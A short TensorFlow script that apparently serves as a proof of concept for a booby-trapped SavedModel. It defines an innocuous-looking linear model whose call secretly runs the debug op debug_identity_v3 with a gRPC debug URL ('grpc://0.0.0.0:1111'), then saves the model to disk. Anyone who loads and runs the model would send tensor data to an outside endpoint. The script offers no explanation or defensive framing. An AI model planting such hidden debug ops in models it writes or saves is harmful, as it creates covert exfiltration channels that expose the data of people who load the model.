import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)

    @tf.function
    def __call__(self, x):
        from tensorflow.python.ops.gen_debug_ops import debug_identity_v3
        debug_identity_v3(
            input=tf.constant("123456768", dtype=tf.string),
            device_name = "",
            tensor_name = "test_tensor",
            io_of_node = "",
            is_input = False,
            io_index = -1,
            debug_urls=["grpc://0.0.0.0:1111"],
            gated_grpc = False
             )
        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'debug_identity_v3'
tf.saved_model.save(model,save_dir)